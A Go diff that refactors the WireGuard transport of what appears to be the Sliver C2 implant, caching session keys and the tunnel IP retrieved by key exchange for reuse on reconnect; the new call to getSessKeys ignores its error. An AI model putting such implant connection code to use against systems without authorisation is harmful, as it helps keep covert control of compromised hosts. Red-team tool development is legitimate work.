@@ -59,6 +59,9 @@ var (
 	wgKeyExchangePort = getWgKeyExchangePort()
 	wgTcpCommsPort    = getWgTcpCommsPort()
 
+	wgSessPrivKey string
+	wgSessPubKey  string
+
 	PingInterval = 2 * time.Minute
 )
 
@@ -151,12 +154,11 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
-// WGConnect - Get a wg connection or die trying
-func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
-
+// getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
+func getSessKeys(address string, port uint16) error {
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
 	if err != nil {
-		return nil, nil, err
+		return err
 	}
 
 	dev.Up()
@@ -170,10 +172,10 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
 		// {{end}}
-		return nil, nil, err
+		return err
 	}
 
-	privKey, pubKey, newIP := doKeyExchange(keyExchangeConnection)
+	wgSessPrivKey, wgSessPubKey, tunAddress = doKeyExchange(keyExchangeConnection)
 
 	// {{if .Config.Debug}}
 	log.Printf("Signaling wg device to go down")
@@ -186,11 +188,19 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to close device.Device: %s", err)
 		// {{end}}
-		return nil, nil, err
+		return err
+	}
+	return nil
+}
+
+// WGConnect - Get a wg connection or die trying
+func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+	if wgSessPrivKey == "" {
+		getSessKeys(address, port)
 	}
 
-	// Bring up second wireguard connection using retrieved keys and IP
-	_, dev, tNet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
+	// Bring up actual wireguard connection using retrieved keys and IP
+	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -207,7 +217,6 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	log.Printf("Successfully connected to sliver listener")
 	// {{end}}
 	tunnelNet = tNet
-	tunAddress = newIP
 	return connection, dev, nil
 }
 
